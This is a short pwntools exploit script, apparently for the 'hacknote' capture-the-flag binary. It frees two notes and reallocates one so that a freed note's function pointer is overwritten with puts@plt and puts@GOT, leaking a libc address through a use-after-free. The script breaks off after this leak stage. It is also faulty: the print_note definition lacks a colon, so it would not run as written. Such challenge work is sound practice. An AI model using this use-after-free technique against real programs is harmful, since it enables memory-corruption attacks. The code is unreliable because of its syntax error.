from pwn import *

p = process('./hacknote')

puts_plt = 0x80484d0
puts_got = 0x0804a024

def add_note(r,size,content):
	r.recvuntil('Your choice :')
	r.sendline('1')
	r.recvuntil('Note size :')
	r.sendline(str(size))
	r.recvuntil('Content :')
	r.sendline(str(content))

def remove_note(r, index):
	r.recvuntil('Your choice :')
	r.sendline('2')
	r.recvuntil('Index :')
	r.sendline(str(index))


def print_note(r, index)
	r.recvuntil('Your choice :')
	r.sendline('3')
	r.recvuntil('Index :')
	r.sendline(str(index))



add_note(p, 0x10, 'AAAA')
add_note(p, 0x10, 'BBBB')
remove_note(p,0)
remove_note(p,1)
payload_leak = p32(puts_plt)
payload_leak += p32(puts_got)
add_note(p, 0x8 ,payload_leak)
print_note(p,0)
